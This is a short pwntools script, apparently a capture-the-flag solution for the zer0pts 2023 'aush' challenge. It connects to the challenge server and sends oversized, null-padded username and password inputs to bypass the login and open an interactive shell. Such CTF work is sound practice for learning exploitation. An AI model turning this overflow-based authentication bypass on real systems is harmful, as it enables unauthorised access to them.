from pwn import *

io = remote('pwn.2023.zer0pts.com', '9006')
# io = process('./aush')
username = b'a' * 511
io.recvline(b'Username:')
io.sendline(username)

username = b'a' * 0x20 + b'\x00' * (511 - 0x20)

io.recvline(b'Password:')
io.sendline(username)

io.interactive()
print([io.recvline() for _ in range(6)])
